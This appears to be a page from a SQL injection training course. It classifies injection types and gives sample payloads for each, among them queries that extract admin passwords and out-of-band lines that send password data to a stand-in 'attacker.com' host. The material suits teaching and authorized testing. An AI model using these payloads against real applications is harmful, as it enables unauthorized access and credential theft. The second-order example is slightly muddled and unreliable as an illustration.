# Types of SQL Injection

SQL injection vulnerabilities can be categorized based on how the attacker retrieves data and the methods used to exploit the vulnerability.

## 1. In-Band SQL Injection (Classic SQLi)

The attacker uses the same communication channel to launch the attack and gather results. This is the most common and easiest to exploit type.

### 1.1 Error-Based SQL Injection

The attacker causes the database to produce error messages that reveal information about the database structure.

**Example:**
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

**Error Message:**
```
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.
```

**Use Cases:**
- Determining database version
- Extracting data through error messages
- Understanding database structure

### 1.2 UNION-Based SQL Injection

Uses the SQL UNION operator to combine results from the injected query with the original query.

**Example:**
```sql
' UNION SELECT username, password FROM users--
```

**Requirements:**
- Number of columns must match
- Data types must be compatible
- Results are displayed in the application response

## 2. Inferential SQL Injection (Blind SQLi)

The attacker cannot see the results directly but can infer information based on the application's behavior.

### 2.1 Boolean-Based Blind SQL Injection

The attacker sends queries that return different responses based on whether a condition is TRUE or FALSE.

**Example:**
```sql
-- Testing if first character of admin password is 'a'
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'--

-- TRUE: Normal page behavior
-- FALSE: Different behavior (error, blank page, etc.)
```

**Characteristics:**
- No direct data output
- Relies on TRUE/FALSE responses
- Time-consuming (one character at a time)
- Effective when errors are suppressed

### 2.2 Time-Based Blind SQL Injection

The attacker uses database functions to cause delays, inferring information based on response time.

**Example (MySQL):**
```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', SLEEP(5), 0)--
```

**Characteristics:**
- No visible output or behavior change
- Uses time delays to confirm TRUE conditions
- Slowest method but works when nothing else does
- Database-specific delay functions required

## 3. Out-of-Band SQL Injection (OAST)

The attacker triggers the database to create a connection to an external server controlled by the attacker.

**Example (MSSQL):**
```sql
'; exec master..xp_dirtree '//attacker.com/share'--
```

**Characteristics:**
- Uses different channels (DNS, HTTP, etc.)
- Useful when in-band and inferential methods fail
- Can exfiltrate data directly
- Requires specific database features and network configurations

**Data Exfiltration Example:**
```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='admin');
exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
```

## 4. Second-Order SQL Injection

The malicious input is stored in the database and later used in a SQL query in an unsafe manner.

**Example:**

**Step 1 - Registration (Input Stored):**
```
Username: admin'--
Password: password123
```

**Step 2 - Later Query (Exploitation):**
```sql
UPDATE users SET email = 'new@email.com' WHERE username = 'admin'--'
-- Password check is bypassed
```

**Characteristics:**
- Delayed exploitation
- Input is stored first, exploited later
- Harder to detect
- Often occurs when developers sanitize input but not stored data

## Comparison Table

| Type | Visibility | Speed | Difficulty | Use Case |
|------|-----------|--------|-----------|----------|
| Error-Based | High | Fast | Easy | Quick enumeration |
| UNION-Based | High | Fast | Easy | Data extraction |
| Boolean-Based | None | Slow | Medium | When errors are suppressed |
| Time-Based | None | Very Slow | Medium | Last resort |
| Out-of-Band | External | Fast | Hard | Async processing |
| Second-Order | Varies | Varies | Hard | Stored input scenarios |

## Identification Strategy

### Step 1: Test for Basic SQLi
```sql
'
"
' OR '1'='1
" OR "1"="1
' OR 1=1--
```

### Step 2: Determine Type

**If you see database errors:**
→ Error-Based SQLi

**If you can see query results:**
→ Try UNION-Based SQLi

**If no errors but behavior changes:**
→ Boolean-Based Blind SQLi

**If no visible changes at all:**
→ Try Time-Based Blind SQLi

**If in-band methods fail:**
→ Try Out-of-Band techniques

## Code Examples by Type

### In-Band (UNION)
```sql
' UNION SELECT NULL, username, password, NULL FROM users--
```

### Boolean-Based Blind
```sql
' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')>0--
```

### Time-Based Blind
```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--  -- MSSQL
' AND IF(1=1, SLEEP(5), 0)--         -- MySQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--  -- PostgreSQL
```

### Out-of-Band
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\a'))--
```

## Detection vs Exploitation

| Phase | In-Band | Blind | Out-of-Band |
|-------|---------|-------|-------------|
| Detection | Easy | Medium | Hard |
| Exploitation | Easy | Hard | Medium |
| Data Retrieval | Fast | Slow | Fast |
| Stealth | Low | Medium | High |

## Key Takeaways

1. **In-Band SQLi** is the most straightforward but easily detected
2. **Blind SQLi** requires patience but works when direct methods fail
3. **Out-of-Band** is powerful but requires specific database features
4. **Second-Order** is subtle and often missed in security reviews
5. Always start with simple tests and escalate to complex techniques

## Next Steps

- Study [Common Injection Locations](common-locations.md)
- Learn [UNION Attack Techniques](../02-exploitation/union-attacks.md)
- Explore [Blind SQLi Methods](../03-blind-sqli/)

---

**Practice on authorized systems only!**
